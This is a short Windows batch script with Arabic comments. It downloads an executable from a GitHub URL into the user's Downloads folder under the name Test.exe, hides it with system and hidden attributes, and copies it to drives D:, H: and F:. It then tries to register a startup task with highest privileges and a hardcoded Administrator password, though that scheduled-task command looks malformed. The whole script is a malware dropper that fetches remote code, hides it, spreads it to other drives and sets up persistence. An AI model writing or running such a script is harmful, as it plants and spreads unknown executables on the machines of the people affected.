 mn@echo off
setlocal

rem تعريف المتغيرات
set "url=https://github.com/sawdadd2022/sks/blob/main/ds.exe"
set "filename=Test.exe"
set "download_dir=%userprofile%\Downloads"  rem مجلد التحميل الافتراضي

rem المسارات المستهدفة للنسخ
set "target_drives=D:\ H:\ F:\" 

rem التأكد من وجود الملف المحمل بالفعل
if exist "%download_dir%\%filename%" (
    echo %filename% is already downloaded.
    goto :hide_and_copy
)

rem تنزيل الملف بدون عرض نافذة PowerShell
echo Downloading %filename% from %url%...
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%url%', '%download_dir%\%filename%')"

rem التحقق من نجاح التنزيل
if exist "%download_dir%\%filename%" (
    echo %filename% downloaded successfully.
) else (
    echo Failed to download %filename% from %url%.
    pause
    exit /b 1
)

:hide_and_copy
rem إخفاء الملف
echo Hiding %filename%...
attrib +s +h "%download_dir%\%filename%"

rem نسخ الملف إلى الأقراص المستهدفة
for %%d in (%target_drives%) do (
    echo Copying %filename% to %%d...
    xcopy /Y "%download_dir%\%filename%" "%%d\"
)

rem إضافة تشغيل البرنامج عند بدء تشغيل الجهاز (يتطلب الصلاحيات الإدارية)
echo Adding to startup...
powershell -Command "(New-Object -ComObject ('Schedule.Service')).Invoke('CreateFolder','TaskFolder','Name','XRayTask','TaskPath','\','User','Administrator','Password','P@ssw0rd','RunLevel','Highest')"
